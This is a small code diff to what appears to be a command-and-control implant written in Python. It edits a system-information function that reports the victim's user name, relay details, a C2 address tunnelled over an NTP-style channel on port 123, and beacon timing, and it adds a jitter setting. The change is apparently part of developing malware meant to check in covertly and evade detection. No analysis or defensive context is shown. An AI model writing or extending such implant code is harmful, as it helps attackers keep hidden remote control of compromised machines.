@@ -370,8 +370,9 @@ def _sysinfo():
         "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
         "relay_port": active_relay,
         "relay_host": _get_lan_ip() if _ntp_relay_server else "",
-        "worker_url": (f"ntp://{_C2_IP}:123" if _C2_IP else WORKER_URL),
-        "beacon_int": BEACON_INT,
+        "worker_url":    (f"ntp://{_C2_IP}:123" if _C2_IP else WORKER_URL),
+        "beacon_int":    BEACON_INT,
+        "beacon_jitter": JITTER,
     }
 
 
